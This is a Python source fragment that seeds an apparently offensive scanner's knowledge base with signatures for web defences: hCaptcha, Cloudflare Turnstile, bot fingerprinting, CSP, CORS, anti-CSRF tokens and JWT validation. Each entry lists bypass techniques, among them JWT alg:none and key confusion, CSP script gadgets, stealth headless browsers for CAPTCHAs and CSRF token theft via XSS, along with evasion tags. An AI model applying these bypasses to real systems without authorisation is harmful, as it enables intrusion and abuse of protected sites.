        detection_patterns=[
            "hcaptcha", "h-captcha", "hcaptcha.com",
        ],
        known_bypasses=[
            "Look for API routes that bypass CAPTCHA enforcement",
            "Test with accessibility cookie (hc_accessibility)",
            "Use mobile or legacy API endpoints",
        ],
        evasion_techniques=[
            "abort_target", "deprioritize",
        ],
        confidence_indicators=[
            "h-captcha-response", "hcaptcha.com/1/api.js",
            "hcaptcha-sitekey",
        ],
        severity="extreme",
    ),
    DefenseSignature(
        defense_id="app-captcha-turnstile",
        defense_type="captcha",
        product="Cloudflare Turnstile",
        detection_patterns=[
            "turnstile", "cf-turnstile", "challenges.cloudflare.com",
        ],
        known_bypasses=[
            "Target API endpoints behind Turnstile that may accept direct requests",
            "Use headless browser with stealth plugins to solve automatically",
            "Look for token reuse windows",
        ],
        evasion_techniques=[
            "abort_target", "deprioritize",
        ],
        confidence_indicators=[
            "cf-turnstile-response", "challenges.cloudflare.com/turnstile",
        ],
        severity="hard",
    ),
    DefenseSignature(
        defense_id="app-bot-detection",
        defense_type="bot_detection",
        product="Bot Detection (Fingerprinting)",
        detection_patterns=[
            "bot detected", "automated request", "suspicious activity",
            "browser verification", "challenge required",
        ],
        known_bypasses=[
            "Use stealth Playwright/Puppeteer with realistic browser fingerprint",
            "Randomize mouse movements, scroll patterns, and click timing",
            "Set realistic navigator properties (webdriver=false, plugins, languages)",
            "Add human-like request timing with gaussian-distributed delays",
        ],
        evasion_techniques=[
            "user_agent_rotate", "random_jitter", "slow_rate",
            "referer_spoof",
        ],
        confidence_indicators=[
            "navigator.webdriver", "fingerprint", "device-fingerprint",
            "x-device-fingerprint", "bot-detection",
        ],
        severity="medium",
    ),
    DefenseSignature(
        defense_id="app-csp",
        defense_type="ids",
        product="Content Security Policy",
        detection_patterns=[
            "content-security-policy", "csp", "report-uri",
            "refused to execute inline script",
        ],
        known_bypasses=[
            "Find JSONP endpoints on whitelisted CSP domains",
            "Use base-tag injection to redirect relative script loads",
            "Angular/Vue template injection if 'unsafe-eval' is allowed",
            "Use CSP report-uri/report-to for information gathering",
            "Script gadgets in whitelisted libraries (e.g. jQuery, Google Analytics)",
        ],
        evasion_techniques=[
            "polymorphic_payload",
        ],
        confidence_indicators=[
            "content-security-policy", "csp-report",
            "report-uri", "report-to",
        ],
        severity="medium",
    ),
    DefenseSignature(
        defense_id="app-cors",
        defense_type="ids",
        product="CORS Restrictions",
        detection_patterns=[
            "access-control-allow-origin", "cors", "cross-origin",
            "origin not allowed", "cors error",
        ],
        known_bypasses=[
            "Test for null origin acceptance (sandboxed iframes)",
            "Check for subdomain wildcard patterns (*.example.com)",
            "Try pre-flight bypass via simple requests (GET/POST with standard headers)",
            "Look for CORS misconfiguration that reflects arbitrary origins",
        ],
        evasion_techniques=[
            "referer_spoof", "header_smuggling",
        ],
        confidence_indicators=[
            "access-control-allow-origin",
            "access-control-allow-credentials",
            "access-control-allow-methods",
        ],
        severity="easy",
    ),
    DefenseSignature(
        defense_id="app-csrf-token",
        defense_type="ids",
        product="Anti-CSRF Tokens",
        detection_patterns=[
            "csrf", "xsrf", "csrf_token", "csrfmiddlewaretoken",
            "authenticity_token", "invalid csrf",
        ],
        known_bypasses=[
            "Check if CSRF token is validated per-session (reuse across requests)",
            "Test if token validation is skipped for non-standard Content-Types",
            "Look for CSRF token leaks in URL parameters, referrer, or API responses",
            "Try removing the token entirely (some apps only validate when present)",
            "Use XSS to extract valid CSRF tokens from the page",
        ],
        evasion_techniques=[
            "token_refresh", "re_authenticate",
        ],
        confidence_indicators=[
            "csrf_token", "csrfmiddlewaretoken", "_csrf",
            "x-csrf-token", "x-xsrf-token", "authenticity_token",
        ],
        severity="easy",
    ),
    DefenseSignature(
        defense_id="app-jwt-validation",
        defense_type="ids",
        product="JWT Validation",
        detection_patterns=[
            "jwt", "invalid token", "token expired",
            "signature verification failed", "invalid signature",
        ],
        known_bypasses=[
            "Try alg:none vulnerability (set algorithm to 'none' and strip signature)",
            "Algorithm confusion: switch RS256 to HS256, sign with public key",
            "Brute force weak signing secrets (rockyou, common passwords)",
            "Kid header injection for key confusion or path traversal",
            "JWK injection via jku header to point to attacker's key server",
        ],
        evasion_techniques=[
            "polymorphic_payload", "token_refresh",
        ],
        confidence_indicators=[
            "eyJ", "authorization: bearer", "jwt",
            "x-access-token", "x-auth-token",
        ],
        severity="medium",
    ),
]


def seed_defense_signatures(db: VulnKnowledgeBase) -> int:
    """
    Load curated defense signature intelligence into the knowledge base.

    Returns the count of defense signatures ingested.
    """
    for sig in _DEFENSE_SIGNATURES:
        db.ingest_defense_signature(sig)

    count = len(_DEFENSE_SIGNATURES)
    logger.info("knowledge.defense_seed_loaded", count=count)
    return count
